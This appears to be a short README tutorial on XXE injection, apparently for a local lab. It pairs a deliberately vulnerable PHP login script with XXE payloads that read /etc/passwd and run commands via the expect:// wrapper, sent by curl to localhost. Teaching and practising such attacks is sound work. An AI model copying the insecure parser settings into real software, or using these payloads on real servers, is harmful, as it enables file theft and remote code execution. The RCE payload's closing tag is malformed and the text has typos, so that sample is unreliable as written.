# XXE-Basics
Basic Overview of XXE

XML external entity injection (also known as XXE) is a web security vulnerability that allows an attacker to interfere with an application's processing of XML data. It often allows an attacker to view files on the application server filesystem, and to interact with any back-end or external systems that the application itself can access.

Some applications use the XML format to transmit data between the browser and the server. Applications that do this virtually always use a standard library or platform API to process the XML data on the server. XXE vulnerabilities arise because the XML specification contains various potentially dangerous features, and standard parsers support these features even if they are not normally used by the application.

XML (Extensible Markup Language) is a very popular data format. It is used in everything from web services (XML-RPC, SOAP, REST) through documents (XML, HTML, DOCX) to image files (SVG, EXIF data). To interpret XML data, an application needs an XML parser (also known as the XML processor).

The easiest and safest way to prevent against XXE attacks it to completely disable Document Type Definitions (DTDs).

Vulnerable PHP Code 

```
<?php 
    libxml_disable_entity_loader (false);
    $xmlfile = file_get_contents('php://input');
    $dom = new DOMDocument();
    $dom->loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD);
    $creds = simplexml_import_dom($dom);
    $user = $creds->user;
    $pass = $creds->pass;
    echo "You have logged in as user $user";
?> 
```

Simple XML Data

```
<creds>
    <user>Ed</user>
    <pass>mypass</pass>
</creds>

```
Send the Request

```
curl -d @xml.txt http://127.0.0.1/xxe.php

```

Expliot XXE to Retrieve /etc/passwd

```
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [ <!ELEMENT foo ANY >
<!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
<creds>
    <user>&xxe;</user>
    <pass>mypass</pass>
</creds>

```
Send the Request

```
curl -d @xml.txt http://127.0.0.1/xxe.php

```
Expliot XXE to gian RCE

Requires the PHP expect module to be enabled

```
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [ <!ELEMENT foo ANY >
<!ENTITY xxe SYSTEM "expect://id" >]>
<creds>
    <user>&xxe;</user>
    <pass>mypass</pass>
</creds

```
Send the Request

```
curl -d @xml.txt http://127.0.0.1/xxe.php

```



